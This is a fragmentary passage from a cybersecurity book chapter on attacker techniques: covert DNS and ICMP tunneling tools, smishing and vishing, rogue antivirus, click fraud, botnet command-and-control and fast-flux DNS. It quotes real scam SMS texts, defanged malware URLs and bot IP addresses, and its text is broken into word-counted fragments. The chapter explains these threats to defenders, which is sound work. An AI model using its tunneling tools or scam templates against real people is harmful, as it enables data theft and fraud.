cation requires that the payload be small and since latency may be high, 
DNS tunnels create many packets and tend to be slow and unresponsive. 
Additionally, complexity may be high because retransmission and other 
delivery options, which are readily available in a TCP stream, may not 
be available. Thus, authors must implement custom solutions.
[Word Count: 100]

As with HTTP tunnels, open source solutions and open services are 
readily available on the Internet. Some of the most common software,
[Word Count: 22]

Resource Records (RRs) Answering
the Question
[Word Count: 6]

0
1
2
3
4
5
6
7
8
9
0
1
2
3
4
5
1
1
1
1
1
1
[Word Count: 22]

Exhibit 2-6  DNS messages. All communications inside of the domain protocol are carried in 
a single format called a message (top); the question section is used to carry the “question” in 
most queries (middle), and the answer, authority and additional sections all share the same format 
(bottom).
[Word Count: 47]

such as NSTX,10 OzymanDNS,11 iodine,12 and heyoka,13 is well estab­
lished and has been around for years. Services, such as DNStunnel.de,14 
provide tunneling capabilities to those that cannot delegate authority 
to an “evil” subdomain and make barriers to entry low.
[Word Count: 40]

As shown in the protocol illustration in Exhibit 2-4, there are 
plenty of data in which to place payload for a tunnel; therefore, ICMP 
offers good throughput in both directions. ICMP tunneling was one 
of the earliest15 methods publicly available to transmit traffic over 
a protocol in a covert way that essentially abused the protocol. The 
open source community actively maintains and makes available sev­
eral software packages to provide this functionality, including Ping 
Tunnel,16 ICMPTX,17 Simple ICMP Tunnel,18 and Skeeve.19
[Word Count: 81]

2.1.2.4  Intermediaries, Steganography, and Other Concepts  Aside from 
the three common tunnels discussed in the previous paragraphs, hack-
ers can modify any protocol that filters through a firewall to behave 
as a tunnel. Assuming deep-packet inspection requires that a given
[Word Count: 40]

0
1
2
3
4
5
6
7
8
9
0
1
2
3
4
5
6
7
8
9
0
1
2
3
4
5
6
7
8
9
0
[Word Count: 31]

Exhibit 2-7  Internet Control Message Protocol (ICMP) echo message.
[Word Count: 9]

protocol at least match the appropriate syntax (headers must match, no 
arbitrary data, etc.), tool writers can coerce even FTP, SMTP, and the 
like into becoming covert channels. All such tunnels have one thing in 
common, however: it is apparent where their destinations lie.
[Word Count: 44]

2.1.2.5  Detection and Prevention  The potential of covertly extending a 
network to the outside world is a clearly unacceptable risk. While the 
firewalls and IDS that are in place today have their roles to play, they 
may not be able to identify or prevent tunneling. Tunnels abuse proto-
cols in a way that matches the syntax or the rules of the specifications
[Word Count: 62]

Now may be the time to start thinking about what may lurk in the 
shadows of networks. Covert exfiltration of information through tun-
nels is bound to increase as the tools to detect existing software and 
controls of existing methods become stronger. Broad-based dynamic 
analytics need to be part of any network user’s strategy to ensure iden-
tification of the not-so-obvious threats that may be emerging.
[Word Count: 66]

2.2.1  Phishing, Smishing, Vishing, and Mobile Malicious Code
[Word Count: 8]

Many phishing attacks against mobile devices use short message 
service (SMS, or smishing) and voice-over Internet protocol (VoIP,
[Word Count: 18]

Phishing by way of mobile phones introduces new challenges for 
attackers and administrators alike. Many phishing attacks against 
mobile devices use SMS (smishing) and VoIP (vishing). Attackers 
often send fraudulent SMS messages to many users attempting to 
gain private information or distribute malicious files. The messages 
include a URL or a phone number with themes similar to those of 
traditional phishing messages. Upon calling a phone number, the user 
may interact with an actual person or a voicemail system—both of 
which are risks to the user’s personal information.
[Word Count: 88]

Many legitimate services suffer from doubt and uncertainty related 
to sending legitimate SMS messages. Organizations should avoid 
repeating mistakes made with e-mail, which for many organizations 
is no longer a viable means of communicating with customers due to 
the pervasiveness of phishing and other fraud.
[Word Count: 45]

•	 hxxp://www.wwqx-mot.com/game
•	 hxxp://www.wwqx-cyw.com/game
•	 hxxp://www.wwqx-sun.com/game
[Word Count: 6]

The “Sexy View” virus attempts to convince recipients to download 
and install a Symbian Installation file (SISX) at the URL, but it does 
not use any exploits to install automatically. Details on this virus are 
publicly available.26
[Word Count: 37]

2.2.1.2  Phishing against Mobile Devices  Most instances of SMS 
phishing (smishing) target banks or financial institutions by sending 
a phone number that the victim calls after receiving the message, 
resulting in a vishing attack (see Exhibit 2-8).
[Word Count: 37]

There are several common themes in smishing messages. The fol-
lowing examples all include phone numbers for victims to call. The 
messages may originate from either a phone number or an e-mail 
address, both of which an attacker can spoof.
[Word Count: 40]

User Calls VoIP Number
Attacker Sends
Fraudulent SMS
With Phone Number
[Word Count: 11]

Exhibit 2-8  Example flow of a smishing or vishing attack to steal private information.
[Word Count: 14]

ApplicationCenter/This is an automated message from Lafayette F.C.U. 
.Your ATM card has been suspended. To reactivate call urgent at 1-567-
248-859427
[Word Count: 21]

From: Jennifer [@] fortheloveofmarketing.com
Your Treasury Department FCU account is expired, for renewal please 
call us toll free 818.462.5049
[Word Count: 19]

jAPANESS MOTORS AUTO AFRIC, You have won a Brand new 
Toyota landcruiser VX, in our annual draw. Call Mr. Peter Aganyanya 
through this No. +254727925287.28
[Word Count: 25]

Announcement from PETRONAS MLSY. CONGRATULATIONS 
your phone number has won a prize of RM 11000. (About US$3,200) 
Please contact the following number at 0062858853982xx tomorrow 
morning at 8.00am. Thank you
[Word Count: 30]

Official Microsoft ANNOUNCEMENT: Congratulations! Your mobile 
phone has won US$ 10 Million prize money. To claim your money, call 
this number XXXXXXXX tomorrow at 8 AM. Thank you.29
[Word Count: 28]

Many of these systems use voicemail systems to steal user informa­
tion, including bank account information. There have been attacks 
where vishers answer the phones themselves. F-Secure documented 
one such incident regarding the 0062858853982xx phone number 
with a transcript and audio files.30 Similar to traditional phishing 
attacks, smishing and vishing attacks frequently use fake rewards and 
fake account alerts.
[Word Count: 59]

In January 2008, the Facebook application Secret Crush began 
phishing users by requesting their mobile phone number through 
the social-networking website. Subsequently, it would send them 
messages from a premium SMS service that costs $6.60 per mes-
sage according to one user afflicted by the scam. Users that reply to 
the premium rate number (19944989) would receive the bill to their 
mobile phone.31
[Word Count: 63]

Whocallsme.com is a resource where users frequently report issues 
related to phone numbers. Users often report SMS scams, banking 
fraud, and other incidents to this website based upon the originating 
phone number. A few examples include
[Word Count: 36]

Dear Credit union customer, we regret to inform you that we had to 
lock your bank account access. Call (647) 827-2796 to restore your bank 
account.
[Word Count: 26]

!!Urgent! Your number has been selected for a $5000 prize guaranteed! 
To claim your prize call +423697497459
[Word Count: 17]

Organizations should monitor their own SMS number services via 
sites like whocallsme.com to see if users are suspicious of their ser­
vices. Such suspicions could indicate mistrust in the legitimate service 
or attackers who are spoofing the number of the affected organization 
to improve their chances of gaining trust.
[Word Count: 49]

2.2.1.3  Conclusions  To combat the uncertainty caused by smishing 
and vishing, organizations that plan to contact users via SMS should 
not encourage users to depend upon caller ID, phone numbers, or the 
contents of a message. To limit exposure to these problems, organiza-
tions should clearly advertise their legitimate SMS numbers via their 
website and avoid sending phone or SMS contact numbers within 
messages whenever they contact users.
[Word Count: 68]

During the past year, fake antivirus programs have become dramati­
cally more prevalent and are now a major threat to enterprises and 
home users. Moreover, attackers often bundle this software with 
stealthier malicious programs. Fortunately, in attackers’ attempts to 
get users’ attention, rogue antivirus software also alerts administra­
tors to system compromises and inadvertently exposes other mali­
cious software.
[Word Count: 59]

Attackers aggressively target users with Trojan applications that 
claim to be antivirus programs. These rogue antivirus applications, 
once installed, falsely report security issues to mislead victims into 
purchasing a purported “full” version, which can cost each victim 
up to US$89.95. Victims have had little success when contacting the 
payment providers for refund and removal.32 PandaSecurity estimates 
that rogue antivirus applications infect approximately 35 million com-
puters each month and that cyber criminals earn US$34 million each 
month through rogue software attacks.33
[Word Count: 81]

“Antivirus XP” and numerous other rogue security applications 
are some of the most prevalent pieces of malicious code that have 
appeared in the first half of 2009 (see Exhibit 2-9). According to Luis 
Corrons of PandaLabs, his company observed a significant growth in 
rogue antivirus applications from January to June 2009, the highest 
being in June 2009 with 152,197 samples.34
[Word Count: 60]

One possible reason for the increase is that pay-per-install and 
affiliate programs encourage more attackers to install such software. 
According to some pay-per-install rogue antivirus sites, affiliate pro­
grams offer an attacker approximately half of the purchase price for 
each victim who buys the software.36 This encourages a diverse group 
of attackers to distribute the software. Though rogue antivirus soft­
ware emerged in 2004, iDefense has observed a huge increase in this 
type of malicious activity between 2007 and 2010.
[Word Count: 80]

Attackers that install rogue antivirus applications often use social-
engineering techniques to trick victims. To spread, some variants are
[Word Count: 19]

Exhibit 2-9  Rogue antivirus programs in 2009. Source: http://www.antiphishing.org/reports/
apwg_report_h1_2009.pdf.35
[Word Count: 10]

bundled with mass-mailing capabilities to send URL links or attach­
ments through e-mail messages. Others attempt to perform search 
engine poisoning, either through sponsored links or by promoting 
their search terms associated with recent events. To update their web­
sites with the most common search terms, actors performing search 
engine poisoning bundle their rogue antivirus applications with other 
programs that monitor and collect user search terms. Some instances 
of social-engineering attacks use fake Adobe Flash codecs or other 
themes to trick victims.
[Word Count: 82]

Many other examples of rogue antivirus applications install by 
using Web exploit kits. Web exploit kit operators may choose to 
install rogue antivirus applications to make money, or they may allow 
third-party groups to purchase installs. In either case, the operator 
may install multiple different malicious programs.
[Word Count: 47]

The business model around rogue security applications encourages 
third parties to distribute code and participate in the revenue stream. 
As a result, there are a variety of different attacks that install rogue 
antivirus applications. No single group is responsible for distributing 
the software because of the shared profits. The use of the pay-per-
install model is a strong motivator for attackers who wish to make 
money from installing software. The huge success of this model of
[Word Count: 76]

Exhibit 2-10  Fake antivirus application displays false threats.
[Word Count: 8]

separation between deployment and exploitation is similar to other 
successful business models like fast-flux and other pay-per-install net­
works. This type of model will guarantee increased activity and new 
actors in the near future.
[Word Count: 34]

Due to its shared benefit, many attackers can make additional rev­
enue from installing rogue antivirus applications. These applications 
do not require attackers to alter existing behavior, and they can install 
multiple different programs at the same time. Due to the frequent 
bundling of rogue antivirus applications with other malicious pro­
grams, organizations should evaluate whether the attacker installed 
any other malicious code.
[Word Count: 63]

In many instances that iDefense investigated, several similar pay­
ment providers exist on the same IP address. The payment providers 
are highly suspicious because they use multiple registration names, 
domains, and contact addresses and countries, despite their singular 
purpose to accept money for rogue antivirus payments.
[Word Count: 46]

Several of the payment provider sites do not list a phone number 
unless replying to an authorized customer. They also list in their terms 
of service that they avoid taking responsibility for customer content.
[Word Count: 34]

2.2.2.2  Conclusion  A large variety of attacks that install rogue anti-
virus applications exists. Many use social engineering because it seems 
somewhat more likely that attackers will be able to convince a victim 
of social engineering to pay for rogue antivirus software. However, 
attackers install it using a variety of other techniques and themes due 
to the pay-per-install model. Organizations that fall victim to rogue
[Word Count: 65]

antivirus software should evaluate infected computers for bundled 
software that often accompanies the malicious programs and that may 
go unnoticed by victims who attempt to disinfect their computers.
[Word Count: 28]

Having provided revenue for a substantial portion of online activity, 
advertising on the Web has largely been a success for advertisers and 
online companies. Not surprisingly, fraudsters abuse ad networks by 
generating invalid traffic for profit, competitive advantage, or even 
retribution. Advertisers complaining about charges for false traffic 
have made combating click fraud a major issue for online advertisers.
[Word Count: 59]

how compromised computers make preventing this type of activity 
very difficult.
[Word Count: 11]

The ultimate goal for the advertiser is to convert ad clicks to actions 
that generate more revenue than the advertising campaign costs. When 
the viewer takes the desired action, be it signing up for a newsletter 
or purchasing a new car, a conversion has occurred. This conversion 
completes the PPC business model. Exhibit 2-11 shows how money 
flows in this business model.
[Word Count: 62]

With the advent of PPC advertising networks like Google 
AdWords and Yahoo! Search Marketing, anybody with a website can 
become an ad publisher. Publishers who use these networks are affili-
ates. Affiliates add HTML code to their website, which draws ads 
from the advertising network and displays them inline with the affili-
ate’s content. The affiliate and the advertising network then split the 
PPC fee each time a viewer clicks an ad.
[Word Count: 72]

2.2.3.2  Click Fraud Motivations  Click fraud occurs when an ad net­
work charges an advertiser for a click when there was no opportunity 
for a legitimate conversion. There are many possible motivations for a 
person to click an advertisement without any intention to purchase a 
product or service. Publishers perform the most obvious and common 
form of click fraud. Clicking an ad on one’s own website directly gen­
erates revenue for the publisher. Clicking the ad fifty times generates 
even more revenue.
[Word Count: 82]

While a publisher can click his or her own ad, he or she could just 
as easily ask friends to click the ads. For instance, a blogger who wants 
to increase revenue might make a post simply asking his or her read­
ers to click every ad on his or her website each time they visit. While 
they are legitimate users, these clicks will not result in a conversion 
for the advertiser.
[Word Count: 72]

An advertiser’s competitor might also be inclined to commit click 
fraud. If each click costs the Acme Corp. money, Acme’s chief rival 
might click the ad a few hundred times a day to cost them as much 
money as possible. In this case, the publisher benefits from the fraud-
ulent clicks, but the motivation is merely to harm the advertiser.
[Word Count: 60]

Exhibit 2-11  Pay-per-click business model.
[Word Count: 5]

Competing publishers might also be motivated to commit click 
fraud. Because click fraud has become such a widespread problem, 
most advertising networks work very hard to detect it and will ban 
affiliates suspected of committing click fraud. A competing publisher 
can click ads on a competitor’s website to frame them for click fraud. 
Once detected, the ad network may ban the competitor, which will 
result in an increased share of the advertising revenue for the actual 
click fraudster.
[Word Count: 78]

Nonfinancial motivations might also cause a person to commit click 
fraud. If a person disagrees with how Acme Corp. treats its workers, 
they might click Acme ads to cost the company additional money. 
As in the case of clicks from a competitor, the intent is to harm the 
advertisers, but the outcome also benefits the publisher.
[Word Count: 56]

2.2.3.3  Click Fraud Tactics and Detection  The simplest form of click 
fraud involves manually clicking advertisements through the browser. 
While this method is effective at generating a small number of addi­
tional clicks, fraudsters have developed sophisticated methods to pro­
duce the volume necessary to earn higher revenue.
[Word Count: 48]

First, the fraudster must create a website that displays advertise­
ments. A popular way to do this is to create a search engine that only 
displays advertisements relevant to a queried word. One such search 
page uses a very unlikely typo of google.com, gooooooooogle.com. The 
top portion of Exhibit 2-12 shows the results returned when searching 
this page for “puppies,” and the bottom portion shows advertisements 
displayed on Google’s search page when querying for the same word.
[Word Count: 77]

All of the results returned by gooooooooogle.com are actually 
advertisements, and many of them are the same ads returned by a 
Google search for the same term. A portion of the fee that advertisers 
pay for each click will go to the owners of gooooooooogle.com.
[Word Count: 45]

With the advertisements in place, the fraudster must now find a way 
to click as many of the ads as possible without the ad network noticing 
the abuse. Botnets, the Swiss Army knife of the modern Internet mis-
creant, are the key to a successful click fraud campaign. As the click 
fraud problem grew, ad networks began developing fraud detection 
mechanisms that made simple click fraud impossible. For instance, 
when a single IP address registers multiple clicks in a 30-minute 
period, the ad network may simply discard all but the first click when
[Word Count: 93]

Figure 2.12  gooooooooogle.com search results for “puppies” (top) and Google search ads for the 
same word (bottom) result in many of the same ads.
[Word Count: 24]

Attacker Techniques and Motivations 
101
[Word Count: 5]

charging the advertisers. Ad networks can also use browser cookies 
to determine when the same user is clicking an ad multiple times. 
Botnets solve these problems for the fraudster because each infected 
computer has a different IP address and a different browser. In 2006, 
Google discovered the Clickbot.A botnet, a click fraud botnet con­
sisting of more than 100,000 nodes.38
[Word Count: 60]

While the distributed nature of botnets benefits click fraud, it can 
also be a detriment. Advertisers display many ads only in countries or 
regions in which their ads are relevant. For instance, a U.S.-based res­
taurant chain may not want to advertise to viewers in China or Russia. 
Clicks emanating from IP addresses in countries that should not see 
the ads might indicate click fraud.
[Word Count: 65]

Behavior patterns after the fraudster clicks an ad are another way 
in which ad networks and advertisers can detect potential click fraud. 
In the PPC industry, an ad click that does not result in any addi­
tional clicks on the website is a bounce, and the percentage of visi­
tors who exhibit that behavior is the bounce rate. While a poor-quality 
website might have a high bounce rate because visitors do not find it 
interesting, if clicks from a particular publisher have a much higher 
bounce rate than others, it may indicate click fraud.
[Word Count: 94]

2.2.3.4  Conclusions  While click fraud appears to be a problem with 
a scope limited to just advertisers and ad networks, fraudsters’ use of 
infected computers to click ad links makes click fraud a problem for 
everyone with a computer. Being part of a click fraud botnet con-
sumes a system’s bandwidth and displays additional advertisements to 
the user, which is usually undesirable.
[Word Count: 62]

Companies should be cautious when spending advertising money 
on the Internet and should check which techniques their publishers
[Word Count: 18]

use to detect and prevent click fraud. Organizations that already 
advertise on the Internet and are concerned that they may be victims 
of click fraud can use the techniques described in this section to detect 
some forms of click fraud. Companies such as Click Forensics39 and 
Anchor Intelligence40 provide third-party solutions to assist in discov­
ering and weeding out invalid ad clicks.
[Word Count: 62]

Systems connected to the Internet are at risk of infection from 
exposure to social-engineering attacks or vulnerability exploitation. 
Regardless of the infection vector, compromised machines can wait 
for commands from the attacker, which turns the system into a bot. 
A bot is a single node added to a network of other infected systems 
called a botnet.
[Word Count: 56]

A botnet is a network of infected systems controlled by an adminis­
trator known as a botmaster. A botmaster controls many bots by issuing 
commands throughout the botnet infrastructure. The ability to run com­
mands on many systems makes botnets practical for malware authors 
seeking a management solution and provides multiple capabilities.
[Word Count: 52]

Botnets would not be capable of performing any activities without 
communication between the botmaster and bots. The type of com­
munication protocol depends on the network topology of the botnet. 
While botnets use many different topologies, all botnets fall into two 
main categories, centralized and decentralized; however, some botnets 
implement elements from both categories to create a hybrid structure.
[Word Count: 59]

A centralized topology receives its name due to the central loca-
tion of the command-and-control (C&C) server(s). The most basic 
form of this topology uses a server to C&C all bots within the bot-
net; however, other more advanced forms of centralized networks 
exist and fall into two subcategories to describe the differences in 
infrastructure. Exhibit 2-13 shows the infrastructures of the differ-
ent centralized botnets.
[Word Count: 66]

A multiserver builds on the basic centralized botnet topology by 
using more than one server for C&C. Multiple C&C servers make 
botnets more reliable and less vulnerable to takedown attempts. This
[Word Count: 31]

Attacker Techniques and Motivations 
103
[Word Count: 5]

type of topology allows bots to receive commands even if one server 
is unreachable. If a server goes offline, the botmaster can still com­
municate with bots through other C&C servers. The Asprox botnet 
was an example of this type of botnet as it issued a configuration file 
to each bot that included a list of C&C servers.
[Word Count: 58]

Regardless of the type of centralized topology, nodes within the 
botnet need to locate the C&C server before receiving commands. 
Most bots do not listen on ports for commands from the botmaster
[Word Count: 32]

Exhibit 2-13  Centralized botnet infrastructures.
[Word Count: 5]

because administrators can easily detect these unknown listening 
ports and network devices could block inbound connection attempts. 
Instead, bots will initiate communication with the C&C server to 
appear legitimate and bypass network controls.
[Word Count: 33]

To allow bots to locate the C&C server, centralized botnets can 
use hardcoded IP addresses. Hardcoded IPs supplied with the mal­
ware inform the bot of the server’s address immediately after infec­
tion; however, this method suffers if the server is unreachable or taken 
down, which renders the bot useless.
[Word Count: 50]

Attacker Techniques and Motivations 
105
[Word Count: 5]

introduces complexity and latency before all bots receive commands. 
Exhibit 2-14 shows a decentralized botnet and exemplifies the com­
plexity and number of communication paths that introduce command 
latency. For example, a version of the Conficker worm incorporated 
P2P communications for C&C. Bots would scan the entire Internet 
for other peers and attempt to share updated binaries with each other 
based on version number.43
[Word Count: 64]

Communication within a botnet is crucial, and many botnets use 
Internet Relay Chat (IRC) as a rally point to manage infected machines. 
Typically, IRC botnets allow a botmaster to issue commands to bots 
connected to an IRC channel. For example, the IRC botnet known 
as SDBot used NOTICE, TOPIC, or private message (PRIVMSG) 
commands to control infected machines in an IRC channel.44 In most 
network environments, the occurrence of IRC activity is anomalous 
because they rarely experience legitimate IRC traffic.
[Word Count: 80]

Other botnets employ common protocols, such as HTTP, for com-
munication. By using common protocols, botnet communications can 
slide under the radar and blend in with legitimate traffic on a network. 
If the botnet uses HTTP for communication, the bot makes GET
[Word Count: 42]

Exhibit 2-14  Decentralized botnet architecture.
[Word Count: 5]

or POST requests to a server and the server replies with commands. 
In some cases, the botnet uses a compromised Web server for C&C 
by issuing commands within HTML comments. This further legiti­
mizes the appearance of botnet communications.
[Word Count: 39]

In other cases, a botnet uses a custom protocol for communica­
tion. Botnets with a decentralized topology generally adapt a P2P 
protocol to fit their needs. The Storm botnet used a variant of a P2P 
protocol called Kademlia. Storm used this modified version, known 
as Overnet, to discover other peers within the botnet and share com­
mands introduced by the botmaster with other peers.45 Other botnets 
use the port of legitimate services such as HTTPS but provide their 
own communication schemes to circumvent firewalls.
[Word Count: 84]

Botnets are very capable at performing malicious deeds for a pro­
longed period. The most obvious capability available through the con­
trol of a large number of infected systems is the capability to carry out 
distributed denial of service (DDoS) attacks. The botmaster can issue 
a command to have bots repeatedly send requests to a server or net­
work. With enough bots and enough requests, the botnet can create a 
denial of service (DoS) condition for the targeted server or network as 
discussed in the “State of the Hack” article on DoS conditions.46
[Word Count: 93]

Botmasters can also use their bots to send spam e-mail messages. 
According to recent research, botnets account for 87.9 percent of all 
spam sent on the Internet.47 A botnet can achieve these numbers by 
having each bot send e-mails at a rapid rate, which can result in mil­
lions or billions of e-mails per day. Spam from these systems is dif­
ficult to block due to the number of unique systems and the constant 
addition of new systems.
[Word Count: 78]

In addition to using bots to send spam, botmasters can steal sensi-
tive information and credentials from the infected systems within the 
botnet. The botmaster can use sensitive information for identity theft 
or to generate revenue by selling the data on the underground market. 
Stolen credentials allow the botmaster to access user accounts, such as 
online banking, social-networking, and e-mail accounts, which can 
lead to online banking fraud or sensitive information theft.
[Word Count: 72]

Botnets also provide a vast resource for hosting by using each bot 
as a server. Botmasters use their botnet as a content delivery network 
(CDN) to host phishing pages and malware on infected systems to 
make server takedown attempts difficult. The vast resources also allow
[Word Count: 45]

Attacker Techniques and Motivations 
107
[Word Count: 5]

botmasters to provide services to other individuals looking to carry out 
malice. These services allow individuals without available resources to 
perform their desired attacks.
[Word Count: 24]

Administrators attempting to detect infected bots within their net­
works need to monitor traffic for botnet communication. Repeated 
anomalous traffic over IRC or nonstandard ports from a system can 
indicate an infected machine participating in a botnet. Detecting bot­
net activity over common ports is more difficult and requires filtering 
out legitimate traffic. To filter out legitimate traffic, the administrator 
needs specific knowledge of the botnet’s communication and how it 
appears while traversing the network. Armed with this knowledge, an 
administrator can create an intrusion detection system (IDS) signa­
ture to detect the botnet communications.
[Word Count: 95]

The efficiency of attackers successfully exploiting systems exposed 
a need for a management system for large quantities of infected 
machines. Attackers evolved their malware to set up logical networks 
of compromised systems to create a powerful tool to carry out malice 
and generate revenue. As the security community scrambles to ana-
lyze, track, and attempt to take down botnets, the botmasters con-
tinue to modify their networks to remain one step ahead.
[Word Count: 72]

This section explains fast-flux attacks, which utilize temporary records 
in the domain name system (DNS) to achieve a distributed network 
of hosts. Resulting in constantly rotating IP addresses, single-flux 
attacks require disabling the DNS server to take down a domain. 
Even more robust, double-flux attacks rotate the IP addresses of both
[Word Count: 51]

hosts and domain name servers, thereby making takedown even more 
difficult. In addition, fast-flux attacks create a layer of anonymity, fur­
ther frustrating enforcement efforts. This technique is not new, but it 
grew dramatically in popularity within the past two years and is now 
a common occurrence.
[Word Count: 47]

Fast-flux is a technique that creates a resilient and balanced net­
work of compromised computers to carry out malicious actions. Fast-
flux utilizes DNS to continually update valid domain names with A 
and NS records that resolve to an ever-changing set of IP addresses. 
Earning the phrase flux, changing the IP addresses within DNS 
records allows a domain name to point to different IP addresses at dif­
ferent times. By changing the resolving IP addresses, domains point 
to the currently active set of infected computers.
[Word Count: 85]

Coined as being “fast” due to the speed of IP changes, this tech­
nique employs short time-to-live (TTL) periods to force frequent 
requests to the authoritative name server for IP addresses that resolve 
the domain. Due to a short TTL, clients and caching servers make 
frequent requests to the name server to update the IP addresses asso­
ciated with the domain. Exhibit 2-15 shows a fast-flux domain using 
a short TTL to cycle new A records every 600 seconds.
[Word Count: 79]

Fast-flux domains incorporate a collection of bots into a network 
of resolvable servers by command-and-control (C&C) servers known 
as motherships. These motherships have important duties in control­
ling and maintaining fast-flux by issuing commands to bots and add-
ing and removing bot IP addresses from DNS records. By cycling IP 
addresses of infected computers in and out of DNS records, the moth-
ership is able to use active bots to host content and services. The IP 
cycling in DNS records also combats unreachable compromised hosts 
due to routing issues, firewall filtering, and infection remediation,
[Word Count: 94]

mtno.ru.
600
IN
A
98.196.113.58
mtno.ru.
600
IN
A
65.102.56.213
mtno.ru.
600
IN
A
98.209.249.15
mtno.ru.
600
IN
A
68.202.88.12
mtno.ru.
600
IN
A
68.92.101.61
mtno.ru.
600
IN
A
74.138.219.230
[Word Count: 30]

Exhibit 2-15  DNS response showing short time-to-live (TTL).
[Word Count: 8]

Attacker Techniques and Motivations 
109
[Word Count: 5]

and insures a high probability of reaching an active bot. In addition 
to controlling infected computers and maintaining DNS records, 
motherships act as the main servers and respond to client requests. 
Compromised computers act as an intermediary for the mothership by 
accepting and forwarding inbound requests to the fast-flux domain. 
Exhibit 2-16 shows the interaction between a client and the fast-flux 
domain shown in Exhibit 2-15.
[Word Count: 66]

Exhibit 2-16 describes a concept known as single-flux, which uti-
lizes static name servers (DNS NS records) to update DNS A records
[Word Count: 22]

Bot 5
68.92.101.61
Bot 6
74.138.219.230
Bot 7
24.216.181.139
Bot 8
24.151.161.136
[Word Count: 12]

Bot 5
68.92.101.61
Bot 6
74.138.219.230
Bot 7
24.216.181.139
Bot 8
24.151.161.136
[Word Count: 12]

98.196.113.58
68.202.88.12
65.102.56.213
98.209.249.15
[Word Count: 4]

68.92.101.61
74.138.219.230
24.216.181.139
24.151.161.136
index.htm
[Word Count: 5]

Bot 1
98.196.113.58
Bot 2
68.202.88.12
Bot 3
65.102.56.213
Bot 4
98.209.249.15
[Word Count: 12]

Exhibit 2-16  Victim interaction to fast-flux infrastructure.
[Word Count: 7]

Attacker Techniques and Motivations 
111
[Word Count: 5]

proof hosting providers with specific IP ranges to block, filtering on 
dispersed IP addresses used in fast-flux domains is futile.
[Word Count: 20]

During the domain takedown procedures, administrators must 
implement safeguards and countermeasures to protect their assets. 
The number of IP addresses resolving the domain and the short turn­
around time renders appliances that block traffic at the network layer 
useless. The best method of blocking traffic to fast-flux domains is to 
black hole the domain at local DNS servers. Black holing the domain 
blocks client requests and stops the communication with the mali­
cious servers. Filtering traffic to known fast-flux domains at local 
Web proxies provides a blocking mechanism for HTTP traffic.
[Word Count: 91]

Fast-flux domains allow actors to carry out malicious deeds anon­
ymously and for relatively long periods. These domains continue to 
spread malicious code, send spam, host phishing, and exploit victims, 
and are a danger to any enterprise. Innovative uses of fast-flux con-
tinue to change in the wild and require reactive countermeasures from 
the security community.
[Word Count: 56]

Section 2.3.2 described the workings of a basic fast-flux infrastruc-
ture, which uses DNS records to obfuscate the location of malicious 
sites and frustrates takedown efforts. Variants of the fast-flux tech-
nique further complicate tracking and takedown by using multiple
[Word Count: 40]

domain name servers or even multiple command-and-control (C&C) 
servers, also known as motherships. These advanced fast-flux meth­
ods are known as double-flux and hydra-flux.
[Word Count: 24]

The preceding section described fast-flux networks and their gen­
eral structures, uses, and resiliency to take down. The lack of in-depth 
detail regarding the types of fast-flux systems requires a second look. 
The three types of fast-flux existing today are known as single-, dou­
ble-, and hydra-flux. All three types of fast-flux utilize domain name 
system (DNS) record updates, occurring on name servers or with 
domain registrars or both, to conceal the source of malicious activity 
in attempts to evade detection and takedown. This section describes 
advanced fast-flux techniques, how they work, and the additional pro­
tection each variation provides.
[Word Count: 100]

Exhibit 2-17 shows the protective layers that each type of flux pro-
vide the source of the malicious content or actor. The diagram shows 
single-flux using groups of bots, a single DNS server, and a single 
mothership that provide three layers of protection between victims
[Word Count: 45]

Attacker Techniques and Motivations 
113
[Word Count: 5]

Exhibit 2-17  Diagram of the protective layers that flux domains provide.
[Word Count: 11]

Exhibit 2-19 shows a decoded configuration file sent from a moth-
ership to an infected computer, which updated the bot with current 
mothership IP addresses. This configuration file is required for the 
hydra-flux infrastructure, as the IP addresses within the <S> tags 
instructed the infected computer to proxy requests to the motherships 
at these addresses.
[Word Count: 55]

Single-, double-, and hydra-flux all use the same techniques to 
evade detection and takedown, but each addresses weaknesses in its 
predecessor by adding a layer of complexity. The layers of complex-
ity prolong malicious campaigns by obscuring the true source of the
[Word Count: 42]

Attacker Techniques and Motivations 
115
[Word Count: 5]

activity. Registrar domain takedown procedures are typically drawn 
out, but provide the most effective solution in stopping malicious 
activity related to fast-flux. New domains registered for fast-flux reuse 
the existing infrastructure and restart the takedown process in an 
endless cycle.
[Word Count: 40]

;; ANSWER SECTION:
Query for ns3.etyj.ru
[Word Count: 6]

Exhibit 2-18  Asprox domain A and NS records.
[Word Count: 8]

64.191.14.85
66.197.168.5
66.197.233.133
[Word Count: 3]

66.199.241.98
66.232.102.169
74.50.106.162</s>
[Word Count: 3]

Exhibit 2-19  Bot configuration file from a mothership.
[Word Count: 8]

1.	 Partyvan.eu, “LogProxy Wiki,” 2008, http://partyvan.eu/static/logproxy.
[Word Count: 6]

html.
	
2.	 Tor, “Tor: Anonymity Online,” 2010, http://www.torproject.org.
	
3.	 Emerging Threats, “CVS Log for sigs/MALWARE/MALWARE_
[Word Count: 15]

Socks_Proxy,” 
2008–2010, 
http://www.emergingthreats.net/cgi-bin/
cvsweb.cgi/sigs/MALWARE/MALWARE_Socks_Proxy.
	
4.	 Al Iverson, “Al Iverson’s DNSBL Resources,” DNSB Resource, 2001–
[Word Count: 14]

2009, http://www.dnsbl.com.
	
5.	 Lars Brinkhoff, “HTTP Tunnel,” 2008, http://www.nocrew.org/software/
[Word Count: 9]

httptunnel.html.
	
6.	 JCraft, “JCraft: Code the Craft, Craft the Code,” 1998–2009, http://
[Word Count: 12]

www.jcraft.com/jhttptunnel/.
	
7.	 “Webtunnel,” 
SourceForge, 
2010, 
http://sourceforge.net/projects/
webtunnel/.
	
8.	 Art of Ping, “PingFu Iris HTTP Tunneling Service,” 2010,
[Word Count: 17]

http://www.artofping.com/pingfu-iris-http-tunneler.php.
	
9.	 netVigilance, “netVigilance HTTP Tunnel,” 2004–2009, http://www.
[Word Count: 8]

netvigilance.com/httptunnel.
	 10.	 Thomer Gil, “NSTX (IP-over-DNS) Howto,” 2007, http://thomer.com/
[Word Count: 9]

howtos/nstx.html.
	 11.	 Doxpara, 
“OzymanDNS,” 
2010, 
http://www.doxpara.com/
ozymandns_src_0.1.tgz.
	 12.	 Kryo, “iodine by Kryo,” 2010, http://code.kryo.se/iodine/.
	 13.	 Alberto Revelli and Nico Leidecker, “Heyoka,” SourceForge, n.d., http://
[Word Count: 24]

heyoka.sourceforge.net.
	 14.	 Julius Plenz, “DNStunnel.de,” 2006, http://dnstunnel.de.
	 15.	 Phrack, 
“Phrack 
Issues,” 
n.d., 
http://www.phrack.com/issues.
html?issue=49&id=6.
